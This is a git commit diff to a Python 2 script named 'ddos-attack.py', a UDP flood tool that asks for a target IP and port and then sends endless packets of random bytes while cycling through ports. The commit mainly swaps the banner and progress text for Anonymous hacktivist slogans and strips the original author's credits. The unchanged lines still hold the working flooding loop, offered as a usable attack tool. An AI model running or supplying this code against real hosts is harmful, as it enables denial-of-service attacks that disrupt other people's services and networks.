bcadc4c2650ed3c9cef4f6719e5fa9cb1d309a8e
DC6 <50107558+h4ckDC6@users.noreply.github.com>
2020-06-21 05:52:41 +0000

    Update ddos-attack.py

--- ddos-attack.py
+++ ddos-attack.py
@@ -17,35 +17,32 @@ sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
 #############
 
-os.system("clear")
-os.system("figlet DDos Attack")
+os.system("We are Anonymous indonesia #OpIndonesia")
+os.system("Anonymous DDos Attack")
 print
-print "Author   : HA-MRX"
-print "You Tube : https://www.youtube.com/c/HA-MRX"
-print "github   : https://github.com/Ha3MrX"
-print "Facebook : https://www.facebook.com/muhamad.jabar222"
+print "WELLCOME TO ANONYMOUS DDOS ATTACK TOOLS"
 print
 ip = raw_input("IP Target : ")
 port = input("Port       : ")
 
 os.system("clear")
 os.system("figlet Attack Starting")
-print "[                    ] 0% "
+print "[we are Anonymous] 0% "
 time.sleep(5)
-print "[=====               ] 25%"
+print "[we are Legion] 25%"
 time.sleep(5)
-print "[==========          ] 50%"
+print "[we do not Forgive] 50%"
 time.sleep(5)
-print "[===============     ] 75%"
+print "[we do not Forget] 75%"
 time.sleep(5)
-print "[====================] 100%"
+print "[EXPECT US] 100%"
 time.sleep(3)
 sent = 0
 while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
-     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     print "DC6 Sent %s packet @bot to %s throught port:%s [CONNECTED]"%(sent,ip,port)
      if port == 65534:
        port = 1
 
